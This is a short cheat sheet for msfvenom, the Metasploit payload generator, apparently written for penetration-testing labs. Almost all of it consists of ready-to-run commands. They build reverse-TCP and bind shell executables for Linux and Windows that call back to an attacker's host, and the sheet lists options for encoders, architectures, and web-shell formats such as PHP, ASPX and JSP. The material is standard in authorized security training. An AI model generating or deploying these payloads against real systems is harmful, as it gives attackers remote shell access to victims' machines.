# msfvenom cheatsheet

## Basic

```
msfvenom -p <payload> -f <format> -o <output_file> LHOST=<attacker ip> LPORT=<attacker port>
```

Example:
reverse tcp shell for a 32 bit linux box
```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.45.123 LPORT=4444 -f elf -o shell.elf
```

## Key options

```
-p      payload
LHOST   your attacking machine IP
LPORT   listening port
-f      output format
-o      output file
-a      architecture
--platform target platform
-e      encoder
-b      bad characters to avoid
```

Example:
Includes architecture and platform for windows
```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.123 LPORT=4444 -f exe -o shell.exe -a x86 --platform windows
```

## Common Formats

```
exe         Windows executable
elf         Linux executable
asp         Classic ASP
aspx        ASP.NET
php         PHP
jsp         Java Server Page
war         Java web archive
raw         raw payload
c           C-style shellcode
python      Python shellcode
powershell  PowerShell
```

## Cheatsheet

### Linux
Reverse
```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<kali_ip> LPORT=4444 -f elf -o shell.elf
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<kali_ip> LPORT=4444 -f elf -o shell.elf
```

Bind
```
msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 -f elf -o bind.elf
```

### Windows
Reverse
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali_ip> LPORT=4444 -f exe -o shell.exe
msfvenom -p windows/shell_reverse_tcp LHOST=<kali_ip> LPORT=4444 -f exe -o shell.exe
```

Bind
```
msfvenom -p windows/shell_bind_tcp LPORT=4444 -f exe -o bind.exe
```

